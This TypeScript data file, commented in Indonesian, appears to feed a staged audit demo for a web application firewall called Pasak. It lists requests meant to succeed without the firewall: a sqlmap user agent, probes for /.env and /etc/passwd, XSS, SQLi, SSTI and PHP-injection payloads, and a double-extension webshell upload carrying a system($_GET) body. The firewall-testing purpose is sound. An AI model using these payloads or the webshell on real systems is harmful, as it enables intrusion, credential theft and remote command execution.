/**
 * Rekomendasi serangan yang 100% lolos (efektif) ketika Pasak BELUM terpasang.
 * Tanpa WAF, Laravel murni menjawab 200/404 — tidak pernah 403 — sehingga
 * semua vektor di bawah dijamin "berhasil masuk" (bibaca: aplikasinya jebol).
 *
 * `stage` mengelompokkan ke tahapan audit berurutan:
 *  1 = Koneksi & baseline, 2 = Recon, 3 = Injeksi, 4 = Webshell & bukti akhir.
 */

/** Satu tahapan audit tanpa-Pasak. */
export interface NoPasakStage {
  id: number;
  title: string;
  goal: string;
  doneHint: string;
}

/** Berkas multipart untuk rekomendasi upload tahap 4. */
export interface NoPasakUpload {
  field: string;
  filename: string;
  content_type: string;
  content: string;
}

/** Satu rekomendasi serangan yang dijamin lolos tanpa WAF. */
export interface NoPasakRecommendation {
  label: string;
  path: string;
  method: string;
  stage: number;
  userAgent?: string;
  upload?: NoPasakUpload;
  why: string;
  proof: string;
}

export const noPasakStages: NoPasakStage[] = [
    {
        id: 1,
        title: "Tahap 1 — Koneksi & Baseline",
        goal: "Pastikan target hidup dan catat respons normal sebelum menyerang.",
        doneHint: "Lanjut bila GET / menjawab 200.",
    },
    {
        id: 2,
        title: "Tahap 2 — Recon (pemetaan)",
        goal: "Buktikan scanner & probe bebas memetakan aplikasi tanpa ditolak.",
        doneHint: "Lanjut bila ketiganya LOLOS (tidak 403).",
    },
    {
        id: 3,
        title: "Tahap 3 — Injeksi",
        goal: "Buktikan payload injeksi (XSS, SQLi, SSTI, PHP) lolos tanpa filter.",
        doneHint: "Lanjut bila keempatnya LOLOS (tidak 403).",
    },
    {
        id: 4,
        title: "Tahap 4 — Webshell & Vonis",
        goal: "Tanam webshell via double-extension, VERIFIKASI file bisa diakses publik, lalu jatuhkan vonis.",
        doneHint: "Selesai bila upload OK + file terverifikasi.",
    },
];

export const noPasakRecommendations: NoPasakRecommendation[] = [
    {
        label: "Baseline GET /",
        path: "/",
        method: "GET",
        stage: 1,
        why: "Respons normal sebagai pembanding: harus 200 sebelum serangan dimulai.",
        proof: "Status 200 = target hidup. Bila bukan 200, periksa URL target & php artisan serve.",
    },
    {
        label: "Scanner UA sqlmap",
        path: "/",
        method: "GET",
        stage: 2,
        userAgent: "sqlmap/1.7.2#stable (http://sqlmap.org)",
        why: "Tanpa deteksi scanner_ua, tool enumerasi bebas memetakan aplikasi.",
        proof: "Status 200. Setelah Pasak: 403.",
    },
    {
        label: "Probe /.env",
        path: "/.env",
        method: "GET",
        stage: 2,
        why: "Tanpa config_probe, file kredensial utama tetap bisa di-probe.",
        proof: "Status 404/200, tidak pernah 403. Setelah Pasak: 403.",
    },
    {
        label: "Path Traversal /etc/passwd",
        path: "/../../../../etc/passwd",
        method: "GET",
        stage: 2,
        why: "Tanpa instant-block path_traversal, traversal mentah diteruskan ke router.",
        proof: "Status 404 (bukan 403) — artinya lolos dari WAF, hanya gagal routing.",
    },
    {
        label: "XSS Reflected <script>",
        path: "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        method: "GET",
        stage: 3,
        why: "Tanpa filter XSS, query dicerminkan ke respons tanpa penyaringan.",
        proof: "Status 200, body memuat kembali query. Tercatat di Monitor beranda.",
    },
    {
        label: "SQLi Auth Bypass OR 1=1",
        path: "/?user=admin%27%20OR%20%271%27%3D%271",
        method: "GET",
        stage: 3,
        why: "Tanpa signature sql_injection, pola OR 1=1 lolos tanpa log/blokir.",
        proof: "Status 200/404, tidak pernah 403. Bukti tidak adanya proteksi.",
    },
    {
        label: "SSTI Canary {{7*7}}",
        path: "/?q=%7B%7B7*7%7D%7D",
        method: "GET",
        stage: 3,
        why: "Tanpa signature ssti, canary template lolos mentah.",
        proof: "Status 200. Setelah Pasak: 403 instant-block.",
    },
    {
        label: "PHP Injection <?php",
        path: "/?name=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E",
        method: "GET",
        stage: 3,
        why: "Tanpa signature php_injection, tag PHP via parameter tidak disaring.",
        proof: "Status 200/404. Setelah Pasak: 403.",
    },
    {
        label: "Upload shell.php.jpg",
        path: "/upload",
        method: "POST",
        stage: 4,
        upload: {
            field: "file",
            filename: "shell.php.jpg",
            content_type: "image/jpeg",
            content: '<?php system($_GET["cmd"]); ?>',
        },
        why: "Tanpa unsafe_filename/webshell_upload, double-extension tidak ditolak di level WAF.",
        proof: "Respons JSON {ok:true} + file mendarat di disk dan bisa dibuka publik.",
    },
];
